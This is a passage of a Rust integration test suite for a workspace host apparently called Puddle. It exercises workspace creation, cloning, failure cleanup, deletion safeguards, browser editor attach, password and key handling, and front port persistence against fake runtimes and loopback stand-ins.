    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let (release, hold) = std::sync::mpsc::channel::<()>();
    let hold = Mutex::new(hold);
    *rig.guest.at_clone.lock().unwrap() = Some(Box::new(move |_| {
        wait_for(&hold.lock().unwrap());
    }));
    let reply = api.post("/api/workspaces", &new_workspace("late")).await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let refused = api
        .delete("/api/workspaces/late/repositories/api", None)
        .await;
    assert_eq!(refused.status, 409, "{}", refused.body);
    assert!(refused.body.contains("creating"), "{}", refused.body);
    release.send(()).unwrap();
    events.until(ended("late"), Duration::from_secs(20)).await;
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_clone_the_runtime_cannot_run_fails_the_operation_and_keeps_the_entry() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "adds").await;
    after_boot_listing(&rig).await;
    // The add looks for the folder first; the next command is the clone.
    rig.runtime.inject(
        Op::Exec,
        Fault::once(disk_error("exec")).only_for("adds").after(1),
    );
    let reply = api
        .post(
            "/api/workspaces/adds/repositories",
            &json!({"kind": "clone", "url": WEB}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("adds"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(
        end["detail"].as_str().unwrap().contains("no space left"),
        "{end}"
    );
    let ws = api.get("/api/workspaces/adds").await.json();
    assert_eq!(ws["repositories"].as_array().unwrap().len(), 2, "{ws}");
    assert_eq!(ws["busy"], json!(null));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_with_no_repositories_is_made_without_a_clone_or_a_sync() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let reply = api
        .post("/api/workspaces", &json!({"name": "bare"}).to_string())
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("bare"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert_eq!(
        events.steps("bare"),
        [
            "preparing_volume",
            "pulling_image",
            "starting",
            "syncing",
            "done"
        ]
    );
    assert_eq!(rig.guest.clone_commands(), Vec::<String>::new());
    assert_eq!(rig.guest.syncs(), 0);
    let ws = api.get("/api/workspaces/bare").await.json();
    assert_eq!(
        (&ws["status"], &ws["repositories"]),
        (&json!("running"), &json!([]))
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_guest_that_stops_answering_between_clones_fails_the_create_and_leaves_nothing() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let body = |name: &str| {
        json!({"name": name, "repositories": [
            {"url": REPO}, {"url": "https://example.org/acme/web"}
        ]})
        .to_string()
    };
    // A create that works shows how many commands a create runs before its second clone.
    api.post("/api/workspaces", &body("probe")).await;
    events.until(ended("probe"), Duration::from_secs(20)).await;
    let before_second_clone = rig
        .runtime
        .calls()
        .iter()
        .filter(|c| c.op == Op::Exec && c.target.as_deref() == Some("probe"))
        .take_while(|c| {
            c.detail.as_deref()
                != Some("git clone -- https://example.org/acme/web /workspaces/probe/web")
        })
        .count();
    rig.runtime.inject(
        Op::Exec,
        Fault::once(disk_error("exec"))
            .only_for("gone")
            .after(u32::try_from(before_second_clone).unwrap()),
    );
    let clones_before = rig.guest.clone_commands().len();
    let reply = api.post("/api/workspaces", &body("gone")).await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("gone"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(
        end["detail"].as_str().unwrap().contains("no space left"),
        "{end}"
    );
    assert_eq!(
        rig.guest.clone_commands()[clones_before..],
        [format!("clone -- {REPO} /workspaces/gone/api")],
        "the second clone never reached the guest"
    );
    assert_eq!(api.get("/api/workspaces/gone").await.status, 404);
    let volumes: Vec<String> = rig
        .runtime
        .list_volumes()
        .await
        .unwrap()
        .into_iter()
        .map(|v| v.name.clone())
        .collect();
    assert_eq!(volumes, ["ws-probe"], "the failed create's volume is gone");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_host_on_a_version_1_list_shows_one_repository_in_its_checkout_and_a_rename_saves_version_2()
 {
    let rig = Rig::new();
    let data = rig.dir.path().join("data");
    std::fs::create_dir_all(&data).unwrap();
    let path = data.join("workspaces.json");
    let v1 = json!({"version": 1, "workspaces": [{
        "id": "acme", "name": "acme", "repo_url": "https://example.org/acme/shop.git",
        "image": FakeRuntime::DEBIAN, "memory_mib": 1024, "created_at": 1, "disk_size_mib": 1024,
        "first_connect_notice_due": false
    }]})
    .to_string();
    std::fs::write(&path, &v1).unwrap();
    let host = rig.start().await;
    let api = api(&host);
    let ws = api.get("/api/workspaces/acme").await.json();
    assert_eq!(
        ws["repositories"],
        json!([{"url": "https://example.org/acme/shop.git", "directory": "shop"}])
    );
    assert_eq!(ws["start_folder"], "shop");
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        v1,
        "a start never writes the list"
    );
    let renamed = api
        .patch(
            "/api/workspaces/acme",
            &json!({"display_name": "Shop"}).to_string(),
        )
        .await;
    assert_eq!(renamed.status, 200, "{}", renamed.body);
    let saved: serde_json::Value = serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
    assert_eq!(saved["version"], 2);
    assert_eq!(
        saved["workspaces"][0]["repositories"],
        json!([{"url": "https://example.org/acme/shop.git", "directory": "shop"}])
    );
    assert_eq!(saved["workspaces"][0]["start_folder"], "shop");
    assert_eq!(saved["workspaces"][0]["display_name"], "Shop");
    assert!(saved["workspaces"][0].get("repo_url").is_none(), "{saved}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_failed_boot_leaves_nothing_behind_and_a_failed_start_says_crashed() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    rig.guest.fail_boot.store(true, Ordering::SeqCst);
    api.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(
        end["detail"].as_str().unwrap().contains("boot hook"),
        "{end}"
    );
    assert!(rig.runtime.list_volumes().await.unwrap().is_empty());
    assert!(rig.runtime.list().await.unwrap().is_empty());

    rig.guest.fail_boot.store(false, Ordering::SeqCst);
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    rig.guest.fail_boot.store(true, Ordering::SeqCst);
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert_eq!(status_of(&api.get("/api/workspaces/acme").await), "crashed");
    // The volume and the workspace survive a failed start.
    assert_eq!(rig.runtime.list_volumes().await.unwrap().len(), 1);
    rig.guest.fail_boot.store(false, Ordering::SeqCst);
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_dirty_workspace_is_deleted_only_with_the_fingerprint_the_user_saw() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    rig.guest.dirty.store(true, Ordering::SeqCst);
    let check = api.get("/api/workspaces/acme/delete-check").await.json();
    assert_eq!(check["clean"], false);
    let fingerprint = check["fingerprint"].as_str().unwrap().to_owned();

    let bare = json!({"confirm": true}).to_string();
    let refused = api.delete("/api/workspaces/acme", Some(&bare)).await;
    assert_eq!(refused.status, 409, "{}", refused.body);
    let stale = json!({"confirm": true, "fingerprint": "0".repeat(64)}).to_string();
    assert_eq!(
        api.delete("/api/workspaces/acme", Some(&stale))
            .await
            .status,
        409
    );
    assert_eq!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .len(),
        1
    );

    let seen = json!({"confirm": true, "fingerprint": fingerprint}).to_string();
    let accepted = api.delete("/api/workspaces/acme", Some(&seen)).await;
    assert_eq!(accepted.status, 202, "{}", accepted.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done", "{end}");
    assert!(
        api.get("/api/workspaces").await.json()["workspaces"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_running_workspace_cannot_be_deleted_and_busy_ones_refuse_a_second_operation() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let delete = api
        .delete(
            "/api/workspaces/acme",
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(delete.status, 409, "{}", delete.body);
    assert_eq!(api.post("/api/workspaces/acme/start", "").await.status, 409);
    assert_eq!(
        api.post("/api/workspaces", &new_workspace("acme"))
            .await
            .status,
        409
    );
    assert_eq!(api.get("/api/workspaces/nope").await.status, 404);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn reclaim_trims_the_running_workspace() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let reply = api.post("/api/workspaces/acme/reclaim", "").await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "done");
    assert!(rig.guest.commands().iter().any(|c| c.ends_with(" trim")));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn attach_opens_the_desktop_editor_through_the_launcher() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let before = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "desktop"}).to_string(),
        )
        .await;
    assert_eq!(before.status, 404);
    create(&api, &mut events, "acme").await;
    let refused = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "desktop"}).to_string(),
        )
        .await;
    assert_eq!(refused.status, 409, "direct SSH is off: {}", refused.body);
    assert!(rig.launcher.opened.lock().unwrap().is_empty());
    allow_direct_ssh(&api, "acme", true).await;
    let reply = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "desktop"}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    assert_eq!(reply.json()["opened"], true);
    assert_eq!(*rig.launcher.opened.lock().unwrap(), ["acme"]);
    let browser = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "browser"}).to_string(),
        )
        .await;
    assert_eq!(browser.json()["opened"], true);
    assert_eq!(rig.launcher.browser.lock().unwrap().len(), 1);
    host.shutdown().await;
}

/// A guest agent that runs on this machine with a stand-in for the editor server, connected to
/// `name`'s route the way the real agent connects from inside the guest. The stand-in counts the
/// connections it accepts and answers every request with a greeting.
struct EditorStandIn {
    accepted: Arc<AtomicUsize>,
    /// Where the agent reads the editor's password from; removing it leaves the agent with none.
    password_file: PathBuf,
    _agent: puddle_agent::Agent,
    _dir: tempfile::TempDir,
}

async fn editor_stand_in(rig: &Rig, name: &str) -> EditorStandIn {
    use puddle_agent::config::Target;
    use puddle_agent::editor::EditorConfig;
    use puddle_agent_proto::editor::EditorServer;
    use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
    let server = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = server.local_addr().unwrap().port();
    let accepted = Arc::new(AtomicUsize::new(0));
    let count = Arc::clone(&accepted);
    tokio::spawn(async move {
        while let Ok((mut conn, _)) = server.accept().await {
            count.fetch_add(1, Ordering::SeqCst);
            tokio::spawn(async move {
                let mut head = [0_u8; 1024];
                let _ = conn.read(&mut head).await;
                let _ = conn
                    .write_all(
                        b"HTTP/1.1 200 OK\r\ncontent-length: 5\r\nconnection: close\r\n\r\nhello",
                    )
                    .await;
                let _ = conn.shutdown().await;
            });
        }
    });
    let dir = tempfile::tempdir().unwrap();
    let password_file = dir.path().join("editor-password");
    std::fs::write(&password_file, "0".repeat(64)).unwrap();
    // Its port is taken, so the agent starts no server of its own and the stand-in answers.
    let mut editor = EditorServer::new("/nonexistent/data", "/nonexistent/work", 120);
    editor.dir = "/nonexistent/release".into();
    editor.port = port;
    let sandbox = WorkspaceName::new(name).unwrap().sandbox_name();
    let route = rig.runtime.routes(&sandbox).first().unwrap().host.clone();
    let agent = puddle_agent::Agent::start(puddle_agent::Config {
        listen: std::net::SocketAddr::new(std::net::Ipv4Addr::LOCALHOST.into(), 0),
        target: Target::Unix(route),
        oom: None,
        ports: None,
        editor: Some(EditorConfig {
            server: editor,
            password_file: password_file.clone(),
        }),
        ..puddle_agent::Config::default()
    })
    .await
    .unwrap();
    EditorStandIn {
        accepted,
        password_file,
        _agent: agent,
        _dir: dir,
    }
}

/// What a window gets for `GET /` at `origin` (`http://<workspace>.localhost:<port>`), without
/// resolving the name: the connection goes to the loopback and the `Host` header says the rest.
async fn window_gets(origin: &str) -> String {
    window_sends(origin, "GET", "/").await
}

/// The raw answer to one request a window sends to the front at `origin`.
async fn window_sends(origin: &str, method: &str, path: &str) -> String {
    use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
    let authority = origin.strip_prefix("http://").unwrap();
    let port: u16 = authority.rsplit(':').next().unwrap().parse().unwrap();
    let mut conn = tokio::net::TcpStream::connect(("127.0.0.1", port))
        .await
        .unwrap();
    conn.write_all(
        format!(
            "{method} {path} HTTP/1.1\r\nHost: {authority}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
        )
        .as_bytes(),
    )
    .await
    .unwrap();
    let mut answer = Vec::new();
    conn.read_to_end(&mut answer).await.unwrap();
    String::from_utf8_lossy(&answer).into_owned()
}

/// Waits until the front carries a request at `origin` to the editor, and returns the answer.
async fn served_at(origin: &str) -> String {
    puddle_test_kit::eventually_async(
        "the front carries a request to the workspace's editor",
        Duration::from_secs(20),
        || async {
            let answer = window_gets(origin).await;
            answer.starts_with("HTTP/1.1 200").then_some(answer)
        },
    )
    .await
}

/// The browser editor target the launcher was handed by the last attach, after an attach that
/// the launcher opened.
async fn browser_target(rig: &Rig, api: &Api, workspace: &str) -> BrowserTarget {
    let reply = api
        .post(
            &format!("/api/workspaces/{workspace}/attach"),
            &json!({"mode": "browser"}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    let body = reply.json();
    assert_eq!(
        body["opened"], true,
        "the launcher opened the window: {body}"
    );
    rig.launcher.browser.lock().unwrap().last().unwrap().clone()
}

/// The origin the launcher was told to open.
async fn browser_origin(rig: &Rig, api: &Api, workspace: &str) -> String {
    browser_target(rig, api, workspace).await.origin
}

#[tokio::test(flavor = "multi_thread")]
async fn a_browser_attach_hands_the_launcher_the_fronts_origin_and_the_front_carries_a_request_to_the_editor()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let editor = editor_stand_in(&rig, "acme").await;

    let origin = browser_origin(&rig, &api, "acme").await;
    let front_port: u16 = origin
        .strip_prefix("http://acme.localhost:")
        .unwrap_or_else(|| panic!("not the workspace's origin: {origin}"))
        .parse()
        .unwrap();
    assert!(
        host.endpoints()
            .list()
            .iter()
            .any(|(addr, kind)| addr.port() == front_port && *kind == EndpointKind::BrowserFront),
        "the origin's port is the host's front, registered as Puddle's own listener"
    );

    // The agent says hello after the attach asked: wait for the front to find it.
    let answer = served_at(&origin).await;
    assert!(answer.ends_with("hello"), "{answer}");
    assert_eq!(editor.accepted.load(Ordering::SeqCst), 1);

    // A stopped workspace is not served: the front looks at the running workspaces on every request.
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let gone = window_gets(&origin).await;
    assert!(gone.starts_with("HTTP/1.1 404"), "{gone}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_browser_attach_gives_the_window_the_front_the_settings_and_a_way_to_the_password() {
    let rig = Rig::new();
    write_global_settings(
        &rig,
        &json!({"schema_version": 2, "workspace_defaults": {"zoom_hotkeys": false}}),
    );
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let editor = editor_stand_in(&rig, "acme").await;

    let target = browser_target(&rig, &api, "acme").await;
    assert_eq!(target.front.port(), front_port_of(&host));
    assert!(target.front.ip().is_loopback());
    assert_eq!(
        target.origin,
        format!("http://acme.localhost:{}", target.front.port())
    );
    assert!(
        !target.settings.zoom_hotkeys.value,
        "the workspace's own setting reaches the window"
    );
    // code-server asks for a password: the window reads it when it signs in, from the guest's file.
    // The agent may say hello after the window asked: the sign-in waits for it.
    let login = target.login.expect("code-server asks for a password");
    assert_eq!(login.password().await.unwrap(), "0".repeat(64));
    // An agent with no password yet, and a workspace that has stopped, are said in words.
    std::fs::remove_file(&editor.password_file).unwrap();
    let err = login.password().await.unwrap_err().to_string();
    assert!(err.contains("no password to sign in with yet"), "{err}");
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let err = login.password().await.unwrap_err().to_string();
    assert_eq!(err, "acme is not running; start it first");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_window_that_signs_in_before_the_agents_hello_waits_for_it_and_gets_the_password() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    // The workspace reports running and no agent has said hello: the window signs in now.
    let target = browser_target(&rig, &api, "acme").await;
    let login = target.login.expect("code-server asks for a password");
    let asked = tokio::spawn(async move { login.password().await });
    // An absence window: nothing is there to signal that the sign-in has not given up.
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(!asked.is_finished(), "the sign-in waits, it does not fail");
    // The hello arrives late.
    let _editor = editor_stand_in(&rig, "acme").await;
    assert_eq!(asked.await.unwrap().unwrap(), "0".repeat(64));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_browser_attach_with_unreadable_settings_still_opens_with_the_defaults() {
    let rig = Rig::new();
    // A global file that is not JSON at all: the read fails, not just an unknown field. The
    // workspace names its memory, so the damaged file does not refuse the create.
    damage_global_settings(&rig);
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    let body = json!({"name": "acme", "repositories": [{"url": REPO}], "memory_mib": 4096});
    assert_eq!(
        api.post("/api/workspaces", &body.to_string()).await.status,
        202
    );
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let _editor = editor_stand_in(&rig, "acme").await;
    let target = browser_target(&rig, &api, "acme").await;
    assert!(target.settings.zoom_hotkeys.value, "the default is zoom on");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_browser_attach_to_microsoft_s_server_has_no_password_to_read() {
    let rig = Rig::new();
    let covering = puddle_settings::MICROSOFT_TERMS_VERSION;
    write_global_settings(&rig, &microsoft_chosen(covering, false));
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let _editor = editor_stand_in(&rig, "acme").await;
    let target = browser_target(&rig, &api, "acme").await;
    assert!(
        target.login.is_none(),
        "the front signs Microsoft's server in with its key cookie"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_browser_attach_without_a_window_says_the_editor_opens_from_the_desktop_app() {
    let rig = Rig::new();
    rig.windowless.store(true, Ordering::SeqCst);
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let _editor = editor_stand_in(&rig, "acme").await;
    let reply = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "browser"}).to_string(),
        )
        .await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    assert_eq!(
        reply.json(),
        json!({
            "opened": false,
            "message": "the browser editor opens from the desktop app"
        })
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_window_that_cannot_open_says_why_in_the_browser_attach_answer() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    *rig.launcher.fail_with.lock().unwrap() =
        Some("the editor gave no session (answer 200)".into());
    let reply = api
        .post(
            "/api/workspaces/acme/attach",
            &json!({"mode": "browser"}).to_string(),
        )
        .await;
    assert_eq!(reply.json()["opened"], false);
    assert_eq!(
        reply.json()["message"],
        "the editor gave no session (answer 200)"
    );
    host.shutdown().await;
}

/// Has the front mint Microsoft's editor key, which stores the workspace's half of it.
async fn mint_key(origin: &str) {
    let answer = window_sends(origin, "POST", puddle_front::microsoft::MINT_PATH).await;
    assert!(answer.starts_with("HTTP/1.1 200"), "{answer}");
}

/// Stops `workspace` and waits for it to end.
async fn stop_and_wait(api: &Api, events: &mut support::Events, workspace: &'static str) {
    api.post(&format!("/api/workspaces/{workspace}/stop"), "")
        .await;
    events
        .until(ended(workspace), Duration::from_secs(20))
        .await;
}

/// Deletes the stopped, clean `workspace` and waits for it to end.
async fn delete_and_wait(api: &Api, events: &mut support::Events, workspace: &'static str) {
    let gone = api
        .delete(
            &format!("/api/workspaces/{workspace}"),
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(gone.status, 202, "{}", gone.body);
    let end = events
        .until(ended(workspace), Duration::from_secs(20))
        .await;
    assert_eq!(end["step"], "done", "{end}");
}

#[tokio::test(flavor = "multi_thread")]
async fn stopping_a_workspace_closes_its_editor_windows() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let _editor = editor_stand_in(&rig, "acme").await;
    browser_target(&rig, &api, "acme").await;
    assert!(rig.launcher.closed.lock().unwrap().is_empty());

    stop_and_wait(&api, &mut events, "acme").await;
    assert_eq!(*rig.launcher.closed.lock().unwrap(), ["acme"]);
    assert!(
        rig.launcher.forgotten.lock().unwrap().is_empty(),
        "a stop keeps the windows' data: the workspace comes back"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_headless_host_stops_and_deletes_with_no_window_to_close() {
    // `puddle serve` has no window: stopping and deleting work as they did.
    let headless = Rig::new();
    headless.windowless.store(true, Ordering::SeqCst);
    let host = headless.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    stop_and_wait(&api, &mut events, "acme").await;
    delete_and_wait(&api, &mut events, "acme").await;
    assert!(!has_problem(&host, "browser-data:acme"));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn deleting_a_workspace_deletes_the_editor_s_secret_key_and_the_windows_data() {
    let rig = Rig::new();
    let covering = puddle_settings::MICROSOFT_TERMS_VERSION;
    write_global_settings(&rig, &microsoft_chosen(covering, false));
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let _editor = editor_stand_in(&rig, "acme").await;
    let origin = browser_origin(&rig, &api, "acme").await;
    served_at(&origin).await;
    mint_key(&origin).await;
    let key = HostPaths::new(rig.dir.path().join("data"))
        .front_keys()
        .join("acme.key");
    let first = std::fs::read_to_string(&key).expect("the front stored Microsoft's key half");

    stop_and_wait(&api, &mut events, "acme").await;
    assert!(
        key.exists(),
        "a stop keeps the key: the workspace comes back"
    );
    delete_and_wait(&api, &mut events, "acme").await;
    assert!(!key.exists(), "a delete removes the key");
    assert_eq!(*rig.launcher.forgotten.lock().unwrap(), ["acme"]);
    assert_eq!(
        *rig.launcher.closed.lock().unwrap(),
        ["acme", "acme"],
        "a stop and a delete each close the windows first"
    );
    assert!(!has_problem(&host, "browser-data:acme"));

    // A workspace of the same name does not inherit the old key.
    create(&api, &mut events, "acme").await;
    let _editor = editor_stand_in(&rig, "acme").await;
    let origin = browser_origin(&rig, &api, "acme").await;
    served_at(&origin).await;
    mint_key(&origin).await;
    assert_ne!(std::fs::read_to_string(&key).unwrap(), first);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_delete_that_cannot_remove_the_editor_s_data_says_so_and_still_deletes() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    stop_and_wait(&api, &mut events, "acme").await;
    // A folder where the key file would be: removing it as a file fails.
    let key = HostPaths::new(rig.dir.path().join("data"))
        .front_keys()
        .join("acme.key");
    std::fs::create_dir_all(&key).unwrap();
    *rig.launcher.forget_fails_with.lock().unwrap() = Some("a window still holds it".into());

    delete_and_wait(&api, &mut events, "acme").await;
    let problem = problem_of(&host, "browser-data:acme");
    assert_eq!(problem.title, "acme's browser editor data was not deleted");
    assert!(
        problem.detail.contains("secret key could not be deleted")
            && problem.detail.contains("a window still holds it"),
        "both failures are named: {}",
        problem.detail
    );
    host.shutdown().await;
}

/// The port of the host's front, from the endpoints it registered.
fn front_port_of(host: &Host<FakeRuntime>) -> u16 {
    let fronts: Vec<u16> = host
        .endpoints()
        .list()
        .iter()
        .filter(|(_, kind)| *kind == EndpointKind::BrowserFront)
        .map(|(addr, _)| addr.port())
        .collect();
    assert_eq!(fronts.len(), 1, "one front is registered: {fronts:?}");
    fronts[0]
}

fn stored_front_port(rig: &Rig) -> Option<u16> {
    let file = HostPaths::new(rig.dir.path().join("data")).front_port_file();
    std::fs::read_to_string(file).ok()?.trim().parse().ok()
}

#[tokio::test(flavor = "multi_thread")]
async fn the_front_keeps_its_port_across_restarts_of_the_host() {
    let rig = Rig::new();
    let first = rig.start().await;
    let port = front_port_of(&first);
    assert_eq!(stored_front_port(&rig), Some(port), "the port is stored");
    first.shutdown().await;
    drop(first); // the next run is a new process: its hold on the data folder ends

    // The same data folder, a new run: the same origin, so the editor's browser storage stays.
    let second = rig.start().await;
    assert_eq!(front_port_of(&second), port);
    second.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_taken_front_port_falls_back_to_another_that_is_then_kept() {
    let rig = Rig::new();
    let (held, taken) = puddle_test_kit::bound_port();
    let file = HostPaths::new(rig.dir.path().join("data")).front_port_file();
    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
    std::fs::write(&file, taken.to_string()).unwrap();

    let first = rig.start().await;
    let moved = front_port_of(&first);
    assert_ne!(moved, taken, "the held port cannot be the front's");
    assert_eq!(
        stored_front_port(&rig),
        Some(moved),
        "the new port is stored"
    );
    first.shutdown().await;
    drop(first);

    // Next run the new port is the usual one, with the old one still taken.
    let second = rig.start().await;
    assert_eq!(front_port_of(&second), moved);
    second.shutdown().await;
    drop(held);
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stored_front_port_that_is_not_a_port_is_replaced() {
    let rig = Rig::new();
    let file = HostPaths::new(rig.dir.path().join("data")).front_port_file();
    std::fs::create_dir_all(file.parent().unwrap()).unwrap();
    std::fs::write(&file, "not a port").unwrap();
    let host = rig.start().await;
    assert_eq!(stored_front_port(&rig), Some(front_port_of(&host)));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_front_port_that_cannot_be_stored_does_not_stop_the_host() {
    let rig = Rig::new();
    // A folder where the file belongs: it cannot be read as a port or replaced by one.
    let file = HostPaths::new(rig.dir.path().join("data")).front_port_file();
    std::fs::create_dir_all(&file).unwrap();
    let host = rig.start().await;
    let port = front_port_of(&host);
    assert_ne!(port, 0, "the front still runs");
    assert_eq!(stored_front_port(&rig), None);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_forwarded_port_s_origin_reaches_that_guest_port_through_the_agent() {
    use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let editor = editor_stand_in(&rig, "acme").await;
    // An app of the workspace on its loopback (the agent stand-in shares this computer's).
    let app = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let app_port = app.local_addr().unwrap().port();
    tokio::spawn(async move {
        while let Ok((mut conn, _)) = app.accept().await {
            tokio::spawn(async move {
                let mut head = [0_u8; 1024];
                let _ = conn.read(&mut head).await;
                let _ = conn
                    .write_all(
                        b"HTTP/1.1 200 OK\r\ncontent-length: 3\r\nconnection: close\r\n\r\napp",
                    )
                    .await;
                let _ = conn.shutdown().await;
            });
        }
    });
    let origin = browser_origin(&rig, &api, "acme").await;
    let forwarded = origin.replacen("http://", &format!("http://{app_port}."), 1);
    let answer = puddle_test_kit::eventually_async(
        "the front carries a request to the app's port",
        Duration::from_secs(20),
        || async {
            let answer = window_gets(&forwarded).await;
            answer.starts_with("HTTP/1.1 200").then_some(answer)
        },
    )
    .await;
    assert!(answer.ends_with("app"), "{answer}");
    assert_eq!(
        editor.accepted.load(Ordering::SeqCst),
        0,
        "the editor was not asked"
    );
    // The agent's own ports (its proxy) are refused by the agent, as for a forward (AT-43): the
    // answer says so, where a free port would say that nothing listens.
    let proxy = window_gets(&origin.replacen("http://", "http://3128.", 1)).await;
    assert!(proxy.starts_with("HTTP/1.1 502"), "{proxy}");
    assert!(proxy.contains("belongs to Puddle's agent"), "{proxy}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_front_serves_the_server_the_workspace_was_started_with_not_what_the_settings_say_now()
{
    let rig = Rig::new();
